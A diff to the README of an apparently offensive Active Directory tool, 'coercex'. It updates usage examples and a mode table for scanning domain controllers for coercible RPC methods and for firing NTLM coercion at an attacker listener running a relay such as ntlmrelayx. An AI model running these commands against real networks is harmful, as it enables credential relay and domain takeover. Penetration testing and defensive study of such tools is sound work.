@@ -26,10 +26,10 @@ uv pip install -e .
 ### Scan for coercible methods
 
 ```bash
-# Scan a single target (no listener -- classifies by RPC error codes)
+# Scan a single target (listener auto-detects local IP)
 coercex scan -t dc01.corp.local -u user -p pass -d corp.local
 
-# Scan with listener to confirm actual callbacks
+# Scan with explicit listener IP
 coercex scan -t dc01.corp.local -l 10.0.0.5 -u user -p pass -d corp.local
 
 # Scan multiple targets from file, EFSR only
@@ -144,7 +144,7 @@ coercex scan -t dc01 -u admin --aes-key 4a3f... -k --dc-host dc01.corp.local -d 
 
 | Mode | Listener | Binds Ports | Transport | Description |
 |------|----------|-------------|-----------|-------------|
-| `scan` | Optional (`-l`) | HTTP+SMB when `-l` given | `--transport smb http` (default: both) | Try all path styles per method. Without `-l`, classifies by RPC error codes. With `-l`, confirms callbacks. |
+| `scan` | Optional (`-l`) | HTTP+SMB listener | `--transport smb http` (default: both) | Try all path styles per method. Always starts a listener for callback confirmation. If `-l` omitted, auto-detects local IP. |
 | `coerce` | **Required** (`-l`) | **None** (external relay) | `--transport smb http` (default: both) | Fire coercion at `--listener` where your relay (e.g. ntlmrelayx) is already running. |
 | `relay` | Optional (`-l`) | HTTP+SMB relay servers | `--transport smb http` (default: both) | Try all path styles through impacket relay servers. If `-l` omitted, auto-detects local IP. |
 
